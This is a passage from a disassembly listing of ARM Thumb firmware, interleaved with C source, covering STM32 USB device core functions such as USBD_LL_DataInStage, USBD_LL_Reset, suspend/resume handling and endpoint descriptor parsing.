 800b36a:	2b00      	cmp	r3, #0
 800b36c:	d001      	beq.n	800b372 <USBD_LL_DataOutStage+0x15c>
      {
        return ret;
 800b36e:	7dfb      	ldrb	r3, [r7, #23]
 800b370:	e000      	b.n	800b374 <USBD_LL_DataOutStage+0x15e>
      }
    }
  }

  return USBD_OK;
 800b372:	2300      	movs	r3, #0
}
 800b374:	4618      	mov	r0, r3
 800b376:	3718      	adds	r7, #24
 800b378:	46bd      	mov	sp, r7
 800b37a:	bd80      	pop	{r7, pc}

0800b37c <USBD_LL_DataInStage>:
  * @param  epnum: endpoint index
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataInStage(USBD_HandleTypeDef *pdev,
                                       uint8_t epnum, uint8_t *pdata)
{
 800b37c:	b580      	push	{r7, lr}
 800b37e:	b086      	sub	sp, #24
 800b380:	af00      	add	r7, sp, #0
 800b382:	60f8      	str	r0, [r7, #12]
 800b384:	460b      	mov	r3, r1
 800b386:	607a      	str	r2, [r7, #4]
 800b388:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret;
  uint8_t idx;

  if (epnum == 0U)
 800b38a:	7afb      	ldrb	r3, [r7, #11]
 800b38c:	2b00      	cmp	r3, #0
 800b38e:	d16f      	bne.n	800b470 <USBD_LL_DataInStage+0xf4>
  {
    pep = &pdev->ep_in[0];
 800b390:	68fb      	ldr	r3, [r7, #12]
 800b392:	3314      	adds	r3, #20
 800b394:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_IN)
 800b396:	68fb      	ldr	r3, [r7, #12]
 800b398:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b39c:	2b02      	cmp	r3, #2
 800b39e:	d15a      	bne.n	800b456 <USBD_LL_DataInStage+0xda>
    {
      if (pep->rem_length > pep->maxpacket)
 800b3a0:	693b      	ldr	r3, [r7, #16]
 800b3a2:	689a      	ldr	r2, [r3, #8]
 800b3a4:	693b      	ldr	r3, [r7, #16]
 800b3a6:	68db      	ldr	r3, [r3, #12]
 800b3a8:	429a      	cmp	r2, r3
 800b3aa:	d914      	bls.n	800b3d6 <USBD_LL_DataInStage+0x5a>
      {
        pep->rem_length -= pep->maxpacket;
 800b3ac:	693b      	ldr	r3, [r7, #16]
 800b3ae:	689a      	ldr	r2, [r3, #8]
 800b3b0:	693b      	ldr	r3, [r7, #16]
 800b3b2:	68db      	ldr	r3, [r3, #12]
 800b3b4:	1ad2      	subs	r2, r2, r3
 800b3b6:	693b      	ldr	r3, [r7, #16]
 800b3b8:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueSendData(pdev, pdata, pep->rem_length);
 800b3ba:	693b      	ldr	r3, [r7, #16]
 800b3bc:	689b      	ldr	r3, [r3, #8]
 800b3be:	461a      	mov	r2, r3
 800b3c0:	6879      	ldr	r1, [r7, #4]
 800b3c2:	68f8      	ldr	r0, [r7, #12]
 800b3c4:	f001 f84b 	bl	800c45e <USBD_CtlContinueSendData>

        /* Prepare endpoint for premature end of transfer */
        (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b3c8:	2300      	movs	r3, #0
 800b3ca:	2200      	movs	r2, #0
 800b3cc:	2100      	movs	r1, #0
 800b3ce:	68f8      	ldr	r0, [r7, #12]
 800b3d0:	f001 fe34 	bl	800d03c <USBD_LL_PrepareReceive>
 800b3d4:	e03f      	b.n	800b456 <USBD_LL_DataInStage+0xda>
      }
      else
      {
        /* last packet is MPS multiple, so send ZLP packet */
        if ((pep->maxpacket == pep->rem_length) &&
 800b3d6:	693b      	ldr	r3, [r7, #16]
 800b3d8:	68da      	ldr	r2, [r3, #12]
 800b3da:	693b      	ldr	r3, [r7, #16]
 800b3dc:	689b      	ldr	r3, [r3, #8]
 800b3de:	429a      	cmp	r2, r3
 800b3e0:	d11c      	bne.n	800b41c <USBD_LL_DataInStage+0xa0>
            (pep->total_length >= pep->maxpacket) &&
 800b3e2:	693b      	ldr	r3, [r7, #16]
 800b3e4:	685a      	ldr	r2, [r3, #4]
 800b3e6:	693b      	ldr	r3, [r7, #16]
 800b3e8:	68db      	ldr	r3, [r3, #12]
        if ((pep->maxpacket == pep->rem_length) &&
 800b3ea:	429a      	cmp	r2, r3
 800b3ec:	d316      	bcc.n	800b41c <USBD_LL_DataInStage+0xa0>
            (pep->total_length < pdev->ep0_data_len))
 800b3ee:	693b      	ldr	r3, [r7, #16]
 800b3f0:	685a      	ldr	r2, [r3, #4]
 800b3f2:	68fb      	ldr	r3, [r7, #12]
 800b3f4:	f8d3 3298 	ldr.w	r3, [r3, #664]	; 0x298
            (pep->total_length >= pep->maxpacket) &&
 800b3f8:	429a      	cmp	r2, r3
 800b3fa:	d20f      	bcs.n	800b41c <USBD_LL_DataInStage+0xa0>
        {
          (void)USBD_CtlContinueSendData(pdev, NULL, 0U);
 800b3fc:	2200      	movs	r2, #0
 800b3fe:	2100      	movs	r1, #0
 800b400:	68f8      	ldr	r0, [r7, #12]
 800b402:	f001 f82c 	bl	800c45e <USBD_CtlContinueSendData>
          pdev->ep0_data_len = 0U;
 800b406:	68fb      	ldr	r3, [r7, #12]
 800b408:	2200      	movs	r2, #0
 800b40a:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

          /* Prepare endpoint for premature end of transfer */
          (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b40e:	2300      	movs	r3, #0
 800b410:	2200      	movs	r2, #0
 800b412:	2100      	movs	r1, #0
 800b414:	68f8      	ldr	r0, [r7, #12]
 800b416:	f001 fe11 	bl	800d03c <USBD_LL_PrepareReceive>
 800b41a:	e01c      	b.n	800b456 <USBD_LL_DataInStage+0xda>
        }
        else
        {
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b41c:	68fb      	ldr	r3, [r7, #12]
 800b41e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b422:	b2db      	uxtb	r3, r3
 800b424:	2b03      	cmp	r3, #3
 800b426:	d10f      	bne.n	800b448 <USBD_LL_DataInStage+0xcc>
          {
            if (pdev->pClass[0]->EP0_TxSent != NULL)
 800b428:	68fb      	ldr	r3, [r7, #12]
 800b42a:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b42e:	68db      	ldr	r3, [r3, #12]
 800b430:	2b00      	cmp	r3, #0
 800b432:	d009      	beq.n	800b448 <USBD_LL_DataInStage+0xcc>
            {
              pdev->classId = 0U;
 800b434:	68fb      	ldr	r3, [r7, #12]
 800b436:	2200      	movs	r2, #0
 800b438:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[0]->EP0_TxSent(pdev);
 800b43c:	68fb      	ldr	r3, [r7, #12]
 800b43e:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b442:	68db      	ldr	r3, [r3, #12]
 800b444:	68f8      	ldr	r0, [r7, #12]
 800b446:	4798      	blx	r3
            }
          }
          (void)USBD_LL_StallEP(pdev, 0x80U);
 800b448:	2180      	movs	r1, #128	; 0x80
 800b44a:	68f8      	ldr	r0, [r7, #12]
 800b44c:	f001 fcee 	bl	800ce2c <USBD_LL_StallEP>
          (void)USBD_CtlReceiveStatus(pdev);
 800b450:	68f8      	ldr	r0, [r7, #12]
 800b452:	f001 f856 	bl	800c502 <USBD_CtlReceiveStatus>
        }
      }
    }

    if (pdev->dev_test_mode != 0U)
 800b456:	68fb      	ldr	r3, [r7, #12]
 800b458:	f893 32a0 	ldrb.w	r3, [r3, #672]	; 0x2a0
 800b45c:	2b00      	cmp	r3, #0
 800b45e:	d03a      	beq.n	800b4d6 <USBD_LL_DataInStage+0x15a>
    {
      (void)USBD_RunTestMode(pdev);
 800b460:	68f8      	ldr	r0, [r7, #12]
 800b462:	f7ff fe42 	bl	800b0ea <USBD_RunTestMode>
      pdev->dev_test_mode = 0U;
 800b466:	68fb      	ldr	r3, [r7, #12]
 800b468:	2200      	movs	r2, #0
 800b46a:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
 800b46e:	e032      	b.n	800b4d6 <USBD_LL_DataInStage+0x15a>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, ((uint8_t)epnum | 0x80U));
 800b470:	7afb      	ldrb	r3, [r7, #11]
 800b472:	f063 037f 	orn	r3, r3, #127	; 0x7f
 800b476:	b2db      	uxtb	r3, r3
 800b478:	4619      	mov	r1, r3
 800b47a:	68f8      	ldr	r0, [r7, #12]
 800b47c:	f000 f8f3 	bl	800b666 <USBD_CoreFindEP>
 800b480:	4603      	mov	r3, r0
 800b482:	75fb      	strb	r3, [r7, #23]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b484:	7dfb      	ldrb	r3, [r7, #23]
 800b486:	2bff      	cmp	r3, #255	; 0xff
 800b488:	d025      	beq.n	800b4d6 <USBD_LL_DataInStage+0x15a>
 800b48a:	7dfb      	ldrb	r3, [r7, #23]
 800b48c:	2b00      	cmp	r3, #0
 800b48e:	d122      	bne.n	800b4d6 <USBD_LL_DataInStage+0x15a>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b490:	68fb      	ldr	r3, [r7, #12]
 800b492:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b496:	b2db      	uxtb	r3, r3
 800b498:	2b03      	cmp	r3, #3
 800b49a:	d11c      	bne.n	800b4d6 <USBD_LL_DataInStage+0x15a>
      {
        if (pdev->pClass[idx]->DataIn != NULL)
 800b49c:	7dfa      	ldrb	r2, [r7, #23]
 800b49e:	68fb      	ldr	r3, [r7, #12]
 800b4a0:	32ae      	adds	r2, #174	; 0xae
 800b4a2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b4a6:	695b      	ldr	r3, [r3, #20]
 800b4a8:	2b00      	cmp	r3, #0
 800b4aa:	d014      	beq.n	800b4d6 <USBD_LL_DataInStage+0x15a>
        {
          pdev->classId = idx;
 800b4ac:	7dfa      	ldrb	r2, [r7, #23]
 800b4ae:	68fb      	ldr	r3, [r7, #12]
 800b4b0:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataIn(pdev, epnum);
 800b4b4:	7dfa      	ldrb	r2, [r7, #23]
 800b4b6:	68fb      	ldr	r3, [r7, #12]
 800b4b8:	32ae      	adds	r2, #174	; 0xae
 800b4ba:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b4be:	695b      	ldr	r3, [r3, #20]
 800b4c0:	7afa      	ldrb	r2, [r7, #11]
 800b4c2:	4611      	mov	r1, r2
 800b4c4:	68f8      	ldr	r0, [r7, #12]
 800b4c6:	4798      	blx	r3
 800b4c8:	4603      	mov	r3, r0
 800b4ca:	75bb      	strb	r3, [r7, #22]

          if (ret != USBD_OK)
 800b4cc:	7dbb      	ldrb	r3, [r7, #22]
 800b4ce:	2b00      	cmp	r3, #0
 800b4d0:	d001      	beq.n	800b4d6 <USBD_LL_DataInStage+0x15a>
          {
            return ret;
 800b4d2:	7dbb      	ldrb	r3, [r7, #22]
 800b4d4:	e000      	b.n	800b4d8 <USBD_LL_DataInStage+0x15c>
        }
      }
    }
  }

  return USBD_OK;
 800b4d6:	2300      	movs	r3, #0
}
 800b4d8:	4618      	mov	r0, r3
 800b4da:	3718      	adds	r7, #24
 800b4dc:	46bd      	mov	sp, r7
 800b4de:	bd80      	pop	{r7, pc}

0800b4e0 <USBD_LL_Reset>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Reset(USBD_HandleTypeDef *pdev)
{
 800b4e0:	b580      	push	{r7, lr}
 800b4e2:	b084      	sub	sp, #16
 800b4e4:	af00      	add	r7, sp, #0
 800b4e6:	6078      	str	r0, [r7, #4]
  USBD_StatusTypeDef ret = USBD_OK;
 800b4e8:	2300      	movs	r3, #0
 800b4ea:	73fb      	strb	r3, [r7, #15]

  /* Upon Reset call user call back */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800b4ec:	687b      	ldr	r3, [r7, #4]
 800b4ee:	2201      	movs	r2, #1
 800b4f0:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->ep0_state = USBD_EP0_IDLE;
 800b4f4:	687b      	ldr	r3, [r7, #4]
 800b4f6:	2200      	movs	r2, #0
 800b4f8:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->dev_config = 0U;
 800b4fc:	687b      	ldr	r3, [r7, #4]
 800b4fe:	2200      	movs	r2, #0
 800b500:	605a      	str	r2, [r3, #4]
  pdev->dev_remote_wakeup = 0U;
 800b502:	687b      	ldr	r3, [r7, #4]
 800b504:	2200      	movs	r2, #0
 800b506:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
  pdev->dev_test_mode = 0U;
 800b50a:	687b      	ldr	r3, [r7, #4]
 800b50c:	2200      	movs	r2, #0
 800b50e:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
      }
    }
  }
#else

  if (pdev->pClass[0] != NULL)
 800b512:	687b      	ldr	r3, [r7, #4]
 800b514:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b518:	2b00      	cmp	r3, #0
 800b51a:	d014      	beq.n	800b546 <USBD_LL_Reset+0x66>
  {
    if (pdev->pClass[0]->DeInit != NULL)
 800b51c:	687b      	ldr	r3, [r7, #4]
 800b51e:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b522:	685b      	ldr	r3, [r3, #4]
 800b524:	2b00      	cmp	r3, #0
 800b526:	d00e      	beq.n	800b546 <USBD_LL_Reset+0x66>
    {
      if (pdev->pClass[0]->DeInit(pdev, (uint8_t)pdev->dev_config) != USBD_OK)
 800b528:	687b      	ldr	r3, [r7, #4]
 800b52a:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b52e:	685b      	ldr	r3, [r3, #4]
 800b530:	687a      	ldr	r2, [r7, #4]
 800b532:	6852      	ldr	r2, [r2, #4]
 800b534:	b2d2      	uxtb	r2, r2
 800b536:	4611      	mov	r1, r2
 800b538:	6878      	ldr	r0, [r7, #4]
 800b53a:	4798      	blx	r3
 800b53c:	4603      	mov	r3, r0
 800b53e:	2b00      	cmp	r3, #0
 800b540:	d001      	beq.n	800b546 <USBD_LL_Reset+0x66>
      {
        ret = USBD_FAIL;
 800b542:	2303      	movs	r3, #3
 800b544:	73fb      	strb	r3, [r7, #15]
    }
  }
#endif /* USE_USBD_COMPOSITE */

  /* Open EP0 OUT */
  (void)USBD_LL_OpenEP(pdev, 0x00U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b546:	2340      	movs	r3, #64	; 0x40
 800b548:	2200      	movs	r2, #0
 800b54a:	2100      	movs	r1, #0
 800b54c:	6878      	ldr	r0, [r7, #4]
 800b54e:	f001 fbc3 	bl	800ccd8 <USBD_LL_OpenEP>
  pdev->ep_out[0x00U & 0xFU].is_used = 1U;
 800b552:	687b      	ldr	r3, [r7, #4]
 800b554:	2201      	movs	r2, #1
 800b556:	f8a3 2164 	strh.w	r2, [r3, #356]	; 0x164

  pdev->ep_out[0].maxpacket = USB_MAX_EP0_SIZE;
 800b55a:	687b      	ldr	r3, [r7, #4]
 800b55c:	2240      	movs	r2, #64	; 0x40
 800b55e:	f8c3 2160 	str.w	r2, [r3, #352]	; 0x160

  /* Open EP0 IN */
  (void)USBD_LL_OpenEP(pdev, 0x80U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b562:	2340      	movs	r3, #64	; 0x40
 800b564:	2200      	movs	r2, #0
 800b566:	2180      	movs	r1, #128	; 0x80
 800b568:	6878      	ldr	r0, [r7, #4]
 800b56a:	f001 fbb5 	bl	800ccd8 <USBD_LL_OpenEP>
  pdev->ep_in[0x80U & 0xFU].is_used = 1U;
 800b56e:	687b      	ldr	r3, [r7, #4]
 800b570:	2201      	movs	r2, #1
 800b572:	849a      	strh	r2, [r3, #36]	; 0x24

  pdev->ep_in[0].maxpacket = USB_MAX_EP0_SIZE;
 800b574:	687b      	ldr	r3, [r7, #4]
 800b576:	2240      	movs	r2, #64	; 0x40
 800b578:	621a      	str	r2, [r3, #32]

  return ret;
 800b57a:	7bfb      	ldrb	r3, [r7, #15]
}
 800b57c:	4618      	mov	r0, r3
 800b57e:	3710      	adds	r7, #16
 800b580:	46bd      	mov	sp, r7
 800b582:	bd80      	pop	{r7, pc}

0800b584 <USBD_LL_SetSpeed>:
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetSpeed(USBD_HandleTypeDef *pdev,
                                    USBD_SpeedTypeDef speed)
{
 800b584:	b480      	push	{r7}
 800b586:	b083      	sub	sp, #12
 800b588:	af00      	add	r7, sp, #0
 800b58a:	6078      	str	r0, [r7, #4]
 800b58c:	460b      	mov	r3, r1
 800b58e:	70fb      	strb	r3, [r7, #3]
  pdev->dev_speed = speed;
 800b590:	687b      	ldr	r3, [r7, #4]
 800b592:	78fa      	ldrb	r2, [r7, #3]
 800b594:	741a      	strb	r2, [r3, #16]

  return USBD_OK;
 800b596:	2300      	movs	r3, #0
}
 800b598:	4618      	mov	r0, r3
 800b59a:	370c      	adds	r7, #12
 800b59c:	46bd      	mov	sp, r7
 800b59e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b5a2:	4770      	bx	lr

0800b5a4 <USBD_LL_Suspend>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Suspend(USBD_HandleTypeDef *pdev)
{
 800b5a4:	b480      	push	{r7}
 800b5a6:	b083      	sub	sp, #12
 800b5a8:	af00      	add	r7, sp, #0
 800b5aa:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state != USBD_STATE_SUSPENDED)
 800b5ac:	687b      	ldr	r3, [r7, #4]
 800b5ae:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b5b2:	b2db      	uxtb	r3, r3
 800b5b4:	2b04      	cmp	r3, #4
 800b5b6:	d006      	beq.n	800b5c6 <USBD_LL_Suspend+0x22>
  {
    pdev->dev_old_state = pdev->dev_state;
 800b5b8:	687b      	ldr	r3, [r7, #4]
 800b5ba:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b5be:	b2da      	uxtb	r2, r3
 800b5c0:	687b      	ldr	r3, [r7, #4]
 800b5c2:	f883 229d 	strb.w	r2, [r3, #669]	; 0x29d
  }

  pdev->dev_state = USBD_STATE_SUSPENDED;
 800b5c6:	687b      	ldr	r3, [r7, #4]
 800b5c8:	2204      	movs	r2, #4
 800b5ca:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c

  return USBD_OK;
 800b5ce:	2300      	movs	r3, #0
}
 800b5d0:	4618      	mov	r0, r3
 800b5d2:	370c      	adds	r7, #12
 800b5d4:	46bd      	mov	sp, r7
 800b5d6:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b5da:	4770      	bx	lr

0800b5dc <USBD_LL_Resume>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Resume(USBD_HandleTypeDef *pdev)
{
 800b5dc:	b480      	push	{r7}
 800b5de:	b083      	sub	sp, #12
 800b5e0:	af00      	add	r7, sp, #0
 800b5e2:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state == USBD_STATE_SUSPENDED)
 800b5e4:	687b      	ldr	r3, [r7, #4]
 800b5e6:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b5ea:	b2db      	uxtb	r3, r3
 800b5ec:	2b04      	cmp	r3, #4
 800b5ee:	d106      	bne.n	800b5fe <USBD_LL_Resume+0x22>
  {
    pdev->dev_state = pdev->dev_old_state;
 800b5f0:	687b      	ldr	r3, [r7, #4]
 800b5f2:	f893 329d 	ldrb.w	r3, [r3, #669]	; 0x29d
 800b5f6:	b2da      	uxtb	r2, r3
 800b5f8:	687b      	ldr	r3, [r7, #4]
 800b5fa:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  }

  return USBD_OK;
 800b5fe:	2300      	movs	r3, #0
}
 800b600:	4618      	mov	r0, r3
 800b602:	370c      	adds	r7, #12
 800b604:	46bd      	mov	sp, r7
 800b606:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b60a:	4770      	bx	lr

0800b60c <USBD_LL_SOF>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_SOF(USBD_HandleTypeDef *pdev)
{
 800b60c:	b580      	push	{r7, lr}
 800b60e:	b082      	sub	sp, #8
 800b610:	af00      	add	r7, sp, #0
 800b612:	6078      	str	r0, [r7, #4]
  /* The SOF event can be distributed for all classes that support it */
  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b614:	687b      	ldr	r3, [r7, #4]
 800b616:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b61a:	b2db      	uxtb	r3, r3
 800b61c:	2b03      	cmp	r3, #3
 800b61e:	d110      	bne.n	800b642 <USBD_LL_SOF+0x36>
          }
        }
      }
    }
#else
    if (pdev->pClass[0] != NULL)
 800b620:	687b      	ldr	r3, [r7, #4]
 800b622:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b626:	2b00      	cmp	r3, #0
 800b628:	d00b      	beq.n	800b642 <USBD_LL_SOF+0x36>
    {
      if (pdev->pClass[0]->SOF != NULL)
 800b62a:	687b      	ldr	r3, [r7, #4]
 800b62c:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b630:	69db      	ldr	r3, [r3, #28]
 800b632:	2b00      	cmp	r3, #0
 800b634:	d005      	beq.n	800b642 <USBD_LL_SOF+0x36>
      {
        (void)pdev->pClass[0]->SOF(pdev);
 800b636:	687b      	ldr	r3, [r7, #4]
 800b638:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b63c:	69db      	ldr	r3, [r3, #28]
 800b63e:	6878      	ldr	r0, [r7, #4]
 800b640:	4798      	blx	r3
      }
    }
#endif /* USE_USBD_COMPOSITE */
  }

  return USBD_OK;
 800b642:	2300      	movs	r3, #0
}
 800b644:	4618      	mov	r0, r3
 800b646:	3708      	adds	r7, #8
 800b648:	46bd      	mov	sp, r7
 800b64a:	bd80      	pop	{r7, pc}

0800b64c <USBD_CoreFindIF>:
  * @param  pdev: device instance
  * @param  index : selected interface number
  * @retval index of the class using the selected interface number. OxFF if no class found.
  */
uint8_t USBD_CoreFindIF(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b64c:	b480      	push	{r7}
 800b64e:	b083      	sub	sp, #12
 800b650:	af00      	add	r7, sp, #0
 800b652:	6078      	str	r0, [r7, #4]
 800b654:	460b      	mov	r3, r1
 800b656:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b658:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b65a:	4618      	mov	r0, r3
 800b65c:	370c      	adds	r7, #12
 800b65e:	46bd      	mov	sp, r7
 800b660:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b664:	4770      	bx	lr

0800b666 <USBD_CoreFindEP>:
  * @param  pdev: device instance
  * @param  index : selected endpoint number
  * @retval index of the class using the selected endpoint number. 0xFF if no class found.
  */
uint8_t USBD_CoreFindEP(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b666:	b480      	push	{r7}
 800b668:	b083      	sub	sp, #12
 800b66a:	af00      	add	r7, sp, #0
 800b66c:	6078      	str	r0, [r7, #4]
 800b66e:	460b      	mov	r3, r1
 800b670:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b672:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b674:	4618      	mov	r0, r3
 800b676:	370c      	adds	r7, #12
 800b678:	46bd      	mov	sp, r7
 800b67a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b67e:	4770      	bx	lr

0800b680 <USBD_GetEpDesc>:
  * @param  pConfDesc:  pointer to Bos descriptor
  * @param  EpAddr:  endpoint address
  * @retval pointer to video endpoint descriptor
  */
void *USBD_GetEpDesc(uint8_t *pConfDesc, uint8_t EpAddr)
{
 800b680:	b580      	push	{r7, lr}
 800b682:	b086      	sub	sp, #24
 800b684:	af00      	add	r7, sp, #0
 800b686:	6078      	str	r0, [r7, #4]
 800b688:	460b      	mov	r3, r1
 800b68a:	70fb      	strb	r3, [r7, #3]
  USBD_DescHeaderTypeDef *pdesc = (USBD_DescHeaderTypeDef *)(void *)pConfDesc;
 800b68c:	687b      	ldr	r3, [r7, #4]
 800b68e:	617b      	str	r3, [r7, #20]
  USBD_ConfigDescTypeDef *desc = (USBD_ConfigDescTypeDef *)(void *)pConfDesc;
 800b690:	687b      	ldr	r3, [r7, #4]
 800b692:	60fb      	str	r3, [r7, #12]
  USBD_EpDescTypeDef *pEpDesc = NULL;
 800b694:	2300      	movs	r3, #0
 800b696:	613b      	str	r3, [r7, #16]
  uint16_t ptr;

  if (desc->wTotalLength > desc->bLength)
 800b698:	68fb      	ldr	r3, [r7, #12]
 800b69a:	885b      	ldrh	r3, [r3, #2]
 800b69c:	b29a      	uxth	r2, r3
 800b69e:	68fb      	ldr	r3, [r7, #12]
 800b6a0:	781b      	ldrb	r3, [r3, #0]
 800b6a2:	b29b      	uxth	r3, r3
 800b6a4:	429a      	cmp	r2, r3
 800b6a6:	d920      	bls.n	800b6ea <USBD_GetEpDesc+0x6a>
  {
    ptr = desc->bLength;
 800b6a8:	68fb      	ldr	r3, [r7, #12]
 800b6aa:	781b      	ldrb	r3, [r3, #0]
 800b6ac:	b29b      	uxth	r3, r3
 800b6ae:	817b      	strh	r3, [r7, #10]

    while (ptr < desc->wTotalLength)
 800b6b0:	e013      	b.n	800b6da <USBD_GetEpDesc+0x5a>
    {
      pdesc = USBD_GetNextDesc((uint8_t *)pdesc, &ptr);
 800b6b2:	f107 030a 	add.w	r3, r7, #10
 800b6b6:	4619      	mov	r1, r3
 800b6b8:	6978      	ldr	r0, [r7, #20]
 800b6ba:	f000 f81b 	bl	800b6f4 <USBD_GetNextDesc>
 800b6be:	6178      	str	r0, [r7, #20]

      if (pdesc->bDescriptorType == USB_DESC_TYPE_ENDPOINT)
 800b6c0:	697b      	ldr	r3, [r7, #20]
 800b6c2:	785b      	ldrb	r3, [r3, #1]
 800b6c4:	2b05      	cmp	r3, #5
 800b6c6:	d108      	bne.n	800b6da <USBD_GetEpDesc+0x5a>
      {
        pEpDesc = (USBD_EpDescTypeDef *)(void *)pdesc;
 800b6c8:	697b      	ldr	r3, [r7, #20]
 800b6ca:	613b      	str	r3, [r7, #16]

        if (pEpDesc->bEndpointAddress == EpAddr)
 800b6cc:	693b      	ldr	r3, [r7, #16]
 800b6ce:	789b      	ldrb	r3, [r3, #2]
 800b6d0:	78fa      	ldrb	r2, [r7, #3]
 800b6d2:	429a      	cmp	r2, r3
 800b6d4:	d008      	beq.n	800b6e8 <USBD_GetEpDesc+0x68>
        {
          break;
        }
        else
        {
          pEpDesc = NULL;
 800b6d6:	2300      	movs	r3, #0
 800b6d8:	613b      	str	r3, [r7, #16]
    while (ptr < desc->wTotalLength)
 800b6da:	68fb      	ldr	r3, [r7, #12]
 800b6dc:	885b      	ldrh	r3, [r3, #2]
 800b6de:	b29a      	uxth	r2, r3
 800b6e0:	897b      	ldrh	r3, [r7, #10]
 800b6e2:	429a      	cmp	r2, r3
 800b6e4:	d8e5      	bhi.n	800b6b2 <USBD_GetEpDesc+0x32>
 800b6e6:	e000      	b.n	800b6ea <USBD_GetEpDesc+0x6a>
          break;
 800b6e8:	bf00      	nop
        }
      }
    }
  }

  return (void *)pEpDesc;
 800b6ea:	693b      	ldr	r3, [r7, #16]
}
 800b6ec:	4618      	mov	r0, r3
 800b6ee:	3718      	adds	r7, #24
 800b6f0:	46bd      	mov	sp, r7
 800b6f2:	bd80      	pop	{r7, pc}

0800b6f4 <USBD_GetNextDesc>:
  * @param  buf: Buffer where the descriptor is available
  * @param  ptr: data pointer inside the descriptor
  * @retval next header
  */
USBD_DescHeaderTypeDef *USBD_GetNextDesc(uint8_t *pbuf, uint16_t *ptr)
{
 800b6f4:	b480      	push	{r7}
 800b6f6:	b085      	sub	sp, #20
 800b6f8:	af00      	add	r7, sp, #0
 800b6fa:	6078      	str	r0, [r7, #4]
 800b6fc:	6039      	str	r1, [r7, #0]
  USBD_DescHeaderTypeDef *pnext = (USBD_DescHeaderTypeDef *)(void *)pbuf;
 800b6fe:	687b      	ldr	r3, [r7, #4]
 800b700:	60fb      	str	r3, [r7, #12]

  *ptr += pnext->bLength;
 800b702:	683b      	ldr	r3, [r7, #0]
 800b704:	881a      	ldrh	r2, [r3, #0]
 800b706:	68fb      	ldr	r3, [r7, #12]
 800b708:	781b      	ldrb	r3, [r3, #0]
 800b70a:	b29b      	uxth	r3, r3
 800b70c:	4413      	add	r3, r2
 800b70e:	b29a      	uxth	r2, r3
 800b710:	683b      	ldr	r3, [r7, #0]
 800b712:	801a      	strh	r2, [r3, #0]
  pnext = (USBD_DescHeaderTypeDef *)(void *)(pbuf + pnext->bLength);
 800b714:	68fb      	ldr	r3, [r7, #12]
 800b716:	781b      	ldrb	r3, [r3, #0]
 800b718:	461a      	mov	r2, r3
 800b71a:	687b      	ldr	r3, [r7, #4]
 800b71c:	4413      	add	r3, r2
 800b71e:	60fb      	str	r3, [r7, #12]

  return (pnext);
